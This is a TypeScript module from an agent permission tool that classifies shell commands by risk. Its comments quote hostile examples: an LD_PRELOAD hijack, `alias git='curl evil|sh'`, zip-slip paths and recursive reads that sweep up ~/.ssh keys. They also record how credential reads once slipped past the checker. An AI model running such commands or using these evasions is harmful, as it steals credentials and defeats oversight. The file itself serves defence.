/**
 * Core shell utilities.
 *
 * By volume this is most of what a coding agent runs: `ls`, `cat`, `head`,
 * `grep`, `echo`, `cd`. Getting these right is what makes LeastGrant quiet.
 *
 * The interesting cases are the utilities that look read-only and are not:
 * `sed -i` edits in place, `tee` writes, `dd` writes anywhere, `find -delete`
 * deletes, and `sort -o` will happily overwrite its own input.
 */

import type { Judgement, KnowledgeCtx, ProgramKnowledge } from './types.js';
import { hasFlag, flagValue, nonFlags } from './types.js';
import { redirectsExecution } from '../shell/unwrap.js';

/** Pure readers: they cannot change anything on disk. */
const READERS = [
  'ls', 'dir', 'cat', 'head', 'tail', 'less', 'more', 'bat', 'nl', 'tac', 'rev',
  'wc', 'cut', 'paste', 'join', 'column', 'fold', 'fmt', 'expand', 'unexpand',
  'file', 'stat', 'du', 'df', 'tree', 'realpath', 'readlink', 'basename', 'dirname',
  'md5sum', 'sha1sum', 'sha256sum', 'sha512sum', 'cksum', 'shasum',
  'xxd', 'hexdump', 'od', 'strings', 'diff', 'cmp', 'comm', 'diff3',
  'jq', 'yq', 'xmllint', 'csvlook',
];

/** Search tools. Same risk as readers, but worth their own capability label. */
const SEARCHERS = ['grep', 'egrep', 'fgrep', 'rg', 'ag', 'ack', 'ugrep'];

/**
 * Does this argument look like a path rather than a command name?
 *
 * Used only to disambiguate the commands that mean different things on cmd and
 * on a POSIX shell. Deliberately generous — a separator, a drive letter, a
 * leading dot or a dotted suffix all count — because being wrong in this
 * direction costs one prompt, and being wrong in the other costs a credential
 * read nobody was asked about.
 */
function looksLikePathArg(a: string): boolean {
  if (!a || a.startsWith('-')) return false;
  return /[\/]/.test(a) || /^[A-Za-z]:/.test(a) || a.startsWith('.') || /\.[A-Za-z0-9_]{1,8}$/.test(a);
}

/** Produce output, touch nothing. */
const PRINTERS = [
  'echo', 'printf', 'yes', 'seq', 'date', 'true', 'false', 'test', '[', 'expr',
  'pwd', 'whoami', 'id', 'hostname', 'uname', 'uptime', 'which', 'type', 'command',
  'tty', 'locale', 'printenv', 'groups', 'arch', 'nproc', 'sleep', 'clear',
];

/** Text transformers reading stdin and writing stdout. */
const FILTERS = ['sort', 'uniq', 'tr', 'sed', 'awk', 'gawk', 'mawk', 'perl', 'cut'];

const WRITERS = ['cp', 'mv', 'mkdir', 'touch', 'ln', 'tee', 'truncate', 'install', 'mktemp'];

const DELETERS = ['rm', 'rmdir', 'unlink', 'shred', 'srm'];

const ARCHIVERS = ['tar', 'zip', 'unzip', 'gzip', 'gunzip', 'bzip2', 'xz', 'zstd', '7z', '7za'];

export const coreutils: ProgramKnowledge = {
  names: [
    ...READERS, ...SEARCHERS, ...PRINTERS, ...FILTERS, ...WRITERS, ...DELETERS, ...ARCHIVERS,
    'cd', 'pushd', 'popd', 'export', 'set', 'unset', 'alias', 'source', 'chmod', 'chown',
    'chgrp', 'dd', 'find', 'xargs', 'ps', 'top', 'htop', 'lsof', 'netstat', 'ss', 'env',
  ],
  describe: 'Standard shell utilities: readers, printers, text filters, and the ones that quietly write',

  classify(argv, ctx) {
    const name = argv[0]!;

    // --- things with no effect at all ---
    if (name === 'cd' || name === 'pushd' || name === 'popd') {
      return { capability: 'meta', note: 'changes the working directory', pathArgs: 'none' };
    }
    if (name === 'export' || name === 'set' || name === 'unset' || name === 'alias') {
      // Setting a variable is not "no effect at all" when the variable decides
      // what runs next. `export LD_PRELOAD=/tmp/evil.so` does nothing on its
      // own and changes every command after it in the same shell — including
      // the familiar ones LeastGrant is happy to approve.
      //
      // The inline spelling was always caught, because `LD_PRELOAD=x git
      // status` is parsed as an assignment prefix and unwrap() tags it. Split
      // across `&&`, or left standing for the next call in a persistent shell,
      // it arrived here and was filed as housekeeping. Same variable, same
      // consequence, opposite verdict.
      //
      // `alias` belongs here too, and is worse if anything: `alias
      // git='curl evil|sh'` redefines a program by name.
      const hijack = argv.slice(1).find((a) => {
        const eq = a.indexOf('=');
        const varName = eq > 0 ? a.slice(0, eq) : a;
        return name === 'alias' ? eq > 0 : redirectsExecution(varName);
      });
      if (hijack) {
        return {
          capability: 'exec.unknown',
          note:
            name === 'alias'
              ? 'redefines what a command name runs, for everything that follows'
              : `sets ${hijack.split('=')[0]}, which changes what later commands in this shell actually run`,
          // Reaches past the project because it reaches past this command: the
          // next thing to run in this shell is affected, whatever that is.
          reach: 'machine',
          pathArgs: 'none',
          // What it actually causes cannot be known from argv — it depends
          // entirely on what runs afterwards. That is the definition of opaque,
          // and it is what stops this from being learnable.
          opaque: true,
        };
      }
      return { capability: 'meta', note: 'sets a shell variable', pathArgs: 'none' };
    }
    if (PRINTERS.includes(name)) {
      // `type` and `more` are two commands wearing one name each.
      //
      // POSIX `type ls` reports how a name would be resolved and touches
      // nothing. cmd's `type file` IS `cat`. Classifying by the POSIX meaning
      // made a Windows credential path an inspect with no path arguments, so no
      // target was produced and every path-keyed floor stayed silent — and the
      // residue signed as the same `type <text>` as ordinary work, which is
      // promotable. Measured: twelve ordinary reads spelled that way promoted
      // the signature, and the credential read that followed came back ALLOW.
      //
      // The two meanings are told apart by the argument, which is the only
      // honest signal available: POSIX `type` takes a command name, cmd's takes
      // a path. An argument that looks like a path gets the reader treatment; a
      // bare name keeps the inspect one, so `type node` is still free.
      if ((name === 'type' || name === 'more') && argv.slice(1).some(looksLikePathArg)) {
        return readJudgement(argv, ctx, false);
      }
      // `printenv` with no args dumps the environment, which may hold secrets,
      // but it does not read a credential *file*; the risk is in what happens
      // to the output, which the pipeline context covers.
      return { capability: 'exec.inspect', pathArgs: 'none' };
    }

    // --- process inspection ---
    if (['ps', 'top', 'htop', 'lsof', 'netstat', 'ss'].includes(name)) {
      return { capability: 'exec.inspect', note: 'lists running processes or sockets', pathArgs: 'none' };
    }

    // --- sed / perl / awk: in-place flags turn readers into writers ---
    if (name === 'sed') {
      // GNU `sed -i`, BSD `sed -i ''`. Also `--in-place`.
      const inPlace = argv.some((a, i) => i > 0 && (a === '-i' || a === '--in-place' || /^-i\S/.test(a) || /^-[a-hj-z]*i[a-z]*$/.test(a)));
      if (inPlace) return writeJudgement(argv, ctx, 'edits files in place');
      return { capability: 'exec.inspect', note: 'transforms text' };
    }
    if (name === 'perl' || name === 'ruby') {
      if (hasFlag(argv, '-i') || argv.some((a) => /^-.*i/.test(a) && a.startsWith('-') && a.includes('i') && !a.startsWith('--'))) {
        return writeJudgement(argv, ctx, 'edits files in place');
      }
      if (hasFlag(argv, '-e', '-E')) {
        return { capability: 'exec.unknown', opaque: true, note: 'runs an inline program' };
      }
      return { capability: 'exec.unknown', opaque: true, note: 'runs a script' };
    }
    if (name === 'awk' || name === 'gawk' || name === 'mawk') {
      const prog = nonFlags(argv).join(' ');
      if (/\b(system|print\s*>|printf\s*>|\|\s*&?\s*"|close\s*\()/.test(prog)) {
        return { capability: 'exec.unknown', opaque: true, note: 'the awk program can run commands or write files' };
      }
      return { capability: 'exec.inspect', note: 'transforms text' };
    }

    // --- sort -o writes ---
    if (name === 'sort') {
      const out = flagValue(argv, '-o', '--output');
      if (out) return writeJudgement(argv, ctx, 'writes its output to a file');
      return { capability: 'exec.inspect' };
    }

    if (name === 'tee') {
      return writeJudgement(argv, ctx, 'writes its input to a file');
    }

    // --- readers and searchers ---
    if (READERS.includes(name) || SEARCHERS.includes(name) || FILTERS.includes(name)) {
      return readJudgement(argv, ctx, walksTree(argv));
    }

    // --- find: read-only unless it acts ---
    if (name === 'find') {
      if (hasFlag(argv, '-delete')) {
        return {
          capability: 'fs.delete',
          scale: 'sweeping',
          reversibility: 'irreversible',
          note: 'deletes every matching file',
        };
      }
      return { capability: 'exec.inspect', note: 'searches the filesystem', scale: 'many' };
    }

    // --- writers ---
    if (WRITERS.includes(name)) {
      const note =
        name === 'mkdir' ? 'creates a directory'
        : name === 'touch' ? 'creates or timestamps a file'
        : name === 'ln' ? 'creates a link'
        : name === 'mv' ? 'moves a file'
        : 'writes files';
      const j = writeJudgement(argv, ctx, note);
      if (name === 'mv') j.reversibility = 'easy';
      if (name === 'mkdir' || name === 'touch') j.reversibility = 'trivial';
      return j;
    }

    // --- deleters ---
    if (DELETERS.includes(name)) {
      const recursive = hasFlag(argv, '-r', '-R', '-rf', '-fr', '--recursive') ||
        argv.some((a, i) => i > 0 && /^-[a-zA-Z]*r[a-zA-Z]*$/.test(a));
      const targets = nonFlags(argv);
      const outside = targets.some((t) => {
        const abs = ctx.resolve(t);
        return abs && !ctx.inWorkspace(abs);
      });
      return {
        capability: 'fs.delete',
        reach: outside ? 'machine' : 'workspace',
        reversibility: name === 'shred' || name === 'srm' ? 'irreversible' : recursive ? 'irreversible' : 'hard',
        scale: recursive ? 'sweeping' : targets.length > 1 ? 'many' : 'single',
        note: recursive ? 'deletes a directory tree' : 'deletes files',
      };
    }

    // --- permissions ---
    if (name === 'chmod' || name === 'chown' || name === 'chgrp') {
      const recursive = hasFlag(argv, '-R', '--recursive');
      const j = writeJudgement(argv, ctx, `changes file ${name === 'chmod' ? 'permissions' : 'ownership'}`);
      if (recursive) j.scale = 'sweeping';
      if (hasFlag(argv, '-R') && nonFlags(argv).some((t) => ctx.resolve(t) && !ctx.inWorkspace(ctx.resolve(t)))) {
        j.reach = 'machine';
        j.reversibility = 'hard';
      }
      return j;
    }

    // --- dd writes wherever `of=` points ---
    if (name === 'dd') {
      const of = argv.find((a) => a.startsWith('of='))?.slice(3);
      if (of) {
        const abs = ctx.resolve(of);
        const outside = abs ? !ctx.inWorkspace(abs) : true;
        return {
          capability: outside ? 'fs.write.outside' : 'fs.write.workspace',
          reversibility: 'irreversible',
          reach: /^\/dev\/(sd|nvme|disk|hd)/.test(of) ? 'machine' : outside ? 'machine' : 'workspace',
          note: /^\/dev\//.test(of) ? 'writes directly to a device' : 'writes a file byte-for-byte',
        };
      }
      return { capability: 'exec.inspect', note: 'reads data' };
    }

    // --- archives: extraction writes, and can write outside the target dir ---
    if (ARCHIVERS.includes(name)) {
      const extracting =
        hasFlag(argv, '-x', '--extract', '-d', '--decompress') ||
        name === 'unzip' || name === 'gunzip' ||
        argv.some((a, i) => i === 1 && /^-?[a-z]*x[a-z]*$/.test(a));
      if (name === 'tar' && hasFlag(argv, '--to-command')) {
        return { capability: 'exec.unknown', opaque: true, note: 'tar --to-command runs a program for each entry' };
      }
      if (extracting) {
        // Where the files land is decided by the archive, not by the command
        // line: a member named `../../etc/cron.d/x` escapes whatever directory
        // you pointed the tool at. That is zip-slip, and it is not visible from
        // argv, so this cannot be judged from argv.
        return {
          capability: 'fs.write.workspace',
          scale: 'sweeping',
          reversibility: 'hard',
          opaque: true,
          note: 'extracts an archive, and the archive chooses where its files land',
        };
      }
      // Creating one. An archiver walks whatever directory it is pointed at,
      // so pointing it at `~` packs up `~/.ssh` without naming it.
      if (nonFlags(argv).some((a) => { const abs = ctx.resolve(a); return abs ? ctx.isCredentialTree(abs) : false; })) {
        return {
          capability: 'fs.write.workspace',
          exposure: 'reads-secrets',
          reach: 'machine',
          scale: 'sweeping',
          note: 'packs up every credential store under a home directory',
        };
      }
      return { capability: 'fs.write.workspace', note: 'creates an archive' };
    }

    if (name === 'env') {
      // Bare `env` prints the environment. `env CMD` was unwrapped already.
      return { capability: 'exec.inspect', pathArgs: 'none' };
    }

    return null;
  },
};

/**
 * Searchers that print the contents of every file in a directory tree.
 *
 * `rg`, `ag`, `ack` and `ugrep` descend by default; `grep` and its aliases need
 * to be told to. This is only asked of the search family: `sed -r`, `sort -r`,
 * `tail -r` and `ls -r` all mean something else by the same letter, and a
 * listing of names is not a read of contents.
 */
const RECURSIVE_BY_DEFAULT = new Set(['rg', 'ag', 'ack', 'ugrep']);

function walksTree(argv: string[]): boolean {
  const name = argv[0]!;
  if (!SEARCHERS.includes(name)) return false;
  if (RECURSIVE_BY_DEFAULT.has(name)) return true;
  return argv.some((a, i) => {
    if (i === 0) return false;
    if (a === '--recursive' || a === '-recursive' || a === '--dereference-recursive') return true;
    // A short-flag cluster containing r or R: `-r`, `-R`, `-rn`, `-Irn`.
    return /^-[a-zA-Z]*[rR][a-zA-Z]*$/.test(a);
  });
}

/**
 * A read whose risk depends entirely on *what* is being read.
 *
 * `recursive` says the program walks down from its arguments rather than
 * reading them. That is the difference between `grep pat ~` — which reads one
 * directory entry and prints nothing — and `grep -r pat ~`, which prints the
 * contents of `~/.ssh/id_rsa`. Judging both by whether `~` is itself a
 * credential store gave the second one the same verdict as the first, and the
 * strictly wider search came out as the safer one.
 */
function readJudgement(argv: string[], ctx: KnowledgeCtx, recursive = false): Judgement {
  const args = nonFlags(argv);
  let sawSecret = false;
  let sawOutside = false;
  let sawTree = false;
  for (const a of args) {
    const abs = ctx.resolve(a);
    if (!abs) continue;
    if (ctx.isSecret(abs)) sawSecret = true;
    else if (recursive && ctx.isCredentialTree(abs)) sawTree = true;
    else if (!ctx.inWorkspace(abs)) sawOutside = true;
  }
  if (sawSecret) return { capability: 'secret.read', note: 'reads a credential file' };
  if (sawTree) {
    return {
      capability: 'secret.read',
      reach: 'machine',
      exposure: 'reads-secrets',
      scale: 'sweeping',
      note: 'prints the contents of every file under a directory that holds credentials',
    };
  }
  if (sawOutside) return { capability: 'fs.read.outside', note: 'reads outside the project' };
  return { capability: 'fs.read.workspace', scale: args.length > 1 ? 'many' : 'single' };
}

/**
 * A write whose risk depends on where it lands.
 *
 * `cp -r ~ /tmp/x` and `tar czf out.tgz ~` copy every byte of every credential
 * store under the named directory, which is the same exposure as reading them
 * — so the tree rule applies on this side too, whenever the invocation
 * recurses. Without it, `cp` and `tar` were a way to collect `~/.ssh` without
 * ever naming it.
 */
function writeJudgement(argv: string[], ctx: KnowledgeCtx, note: string): Judgement {
  const args = nonFlags(argv);
  // `-a` counts only for `cp`, where it means archive (and implies -R); it means
  // "append" to `tee` and "access time" to `touch`, neither of which walks.
  const recursiveLetters = argv[0] === 'cp' ? /^-[a-zA-Z]*[rRa][a-zA-Z]*$/ : /^-[a-zA-Z]*[rR][a-zA-Z]*$/;
  const recursive = argv.some(
    (a, i) => i > 0 && (a === '--recursive' || a === '--archive' || (!a.startsWith('--') && recursiveLetters.test(a))),
  );
  let outside = false;
  let secret = false;
  let tree = false;
  for (const a of args) {
    const abs = ctx.resolve(a);
    if (!abs) continue;
    if (ctx.isSecret(abs)) secret = true;
    if (recursive && ctx.isCredentialTree(abs)) tree = true;
    if (!ctx.inWorkspace(abs)) outside = true;
  }
  const j: Judgement = {
    capability: outside ? 'fs.write.outside' : 'fs.write.workspace',
    reach: outside || tree ? 'machine' : 'workspace',
    scale: tree ? 'sweeping' : args.length > 2 ? 'many' : 'single',
    note: secret
      ? `${note}, over a credential file`
      : tree
        ? `${note}, over every credential store under a home directory`
        : note,
  };
  if (secret || tree) j.exposure = 'reads-secrets';
  return j;
}
